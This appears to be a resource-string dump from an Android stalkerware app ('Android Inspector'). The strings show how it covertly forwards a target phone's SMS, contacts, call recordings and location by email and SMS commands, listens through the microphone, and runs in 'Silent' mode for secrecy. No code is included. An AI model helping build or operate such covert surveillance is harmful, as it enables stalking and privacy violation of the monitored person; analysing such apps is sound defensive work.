resources.string: (contacts, SMS and phone call list attached)
Hi, this is an auto mail from %s with contacts, SMS and phone call list attached.
Hi,this is an auto mail from %s with phone call recording attached.
The target phone is now being viewed or operated, so do not get its location for safety reason. Please try again later.
Click hyperlink to see location: http://maps.google.com/?q=%s
Sorry, cannot get location now. Please try again later. Contact support if necessary.
Exception occurred in the target phone, so environment listening failed.
The target phone is now in a call, so you cannot listen to its environment.
The target phone is now being viewed or operated, so you cannot listen to its environment for safety reason.
Only GMail and QQ mail are supported.
%s is not a valid mail sender
Warning: %s is NOT a valid mail address.
Permitted only when using your own mail sender.
Please input at least one target number segment(4 digits at least).
Record only when the phone call number contains the target segment(at least 4 digits). Support 9 segments at maximum. Separate by blank space.
9 target number segments at maximum, separate by blank space.
ERROR: 4 digits per number at least.
ERROR: %s is not a valid mobile phone number.
Forward all SMS in real-time. Attention to its possible cost.
Separate with blank space. No more than 9 words.
Please input sensitive words (separate by blank space).
No more than %d sensitive words permitted, the surplus words will be ignored.
Send SMS #location to get back its location.
Recommend to use "Silent" or "Wi-Fi Silent" mode for secret and imperceptibility.
Only 3 times recording permitted in trial.
Send SMS #env to listen to target phone environment.
Get all phone calls, SMS, contacts and send to receiver mailbox.
Send a SMS to receiver phone.
A test SMS from Android Inspector.
Failed. Please check the receiver phone number and the mobile signal.
Set mail address, phone number, sensitive words and etc.
This dialog can be triggered again by sending ### SMS.
Please restart phone to enable all features and settings.
Sent a mail to your mail box successfully
Failed to send mail. Please check your mail setting.
Network currently disconnected. Do you want to enable wireless network now?
Invalid key. Probably it has been used. Please contact the software maker for support.
ERROR: failed to write license key information.
ERROR: failed to write license type information. Please try again or contact supporter.
Make sure your mobile connected and not in flying mode.
Sent validation SMS to server successfully.
ERROR: failed to send validation SMS to server. Please exit and try again or contact software support.
AndroidEye: trial expired in %s, please contact
Notice: Android Inspector trial expired, please contact
Notice: transferred SMS reached 5 limitation. For getting license, please contact
Notice: phone call recording reached 3 limitation. For getting license, please contact
The phone number of this SMS is the new number. Please send #9#+the new number to target phone to confirm (will not display there).
Out of trial or not licensed, setting dialog cannot be triggered.
Indication failed. You are not using the master phone, please use master phone %s to send indication.
Register failed. Please check your license or contact support.
Register failed. Please send indication SMS again or contact support.
Cannot register because target phone had been stopped by administrator. Please contact support for details.
Target phone had been registered. Unnecessary to register again.
Failed to write register info. Try again or contact support.
Uninstall failed. This phone is currently not registered.
Failed to set mail sender. Please check SMS you sent (Only GMail and QQ permitted) or contact support.
Failed to cancel mail sender. Recommend keeping your mail sender for protecting your privacy in order to keep recording to all phone calls. Contact support if necessary.
Failed to set master mail address. Please check the SMS you sent or contact support.
Failed to set master phone. Please check the SMS you sent or contact support.
Failed to set info collection interval. Please check the SMS you sent or contact support.
Set recording target phone numbers successfully.
Failed to set recording target phone numbers. Please check the SMS you sent or contact support.
Set recording all phone calls successfully.
It is only allowed to record all phone calls by using your own mail sender. Please set your mail sender by #1 indication. Contact support if necessary.
Failed to set networks connection mode successfully. Please check the SMS you sent or contact support.
Failed to set sensitive words. Please check the SMS you sent (9 words at maximum) or contact support.
Failed to enable forwarding all SMS.
Failed to disable forwarding all SMS.
Android Inspector Message: this phone has been stopped by administrator successfully.
Android Inspector Message: this phone has been restored by administrator successfully.
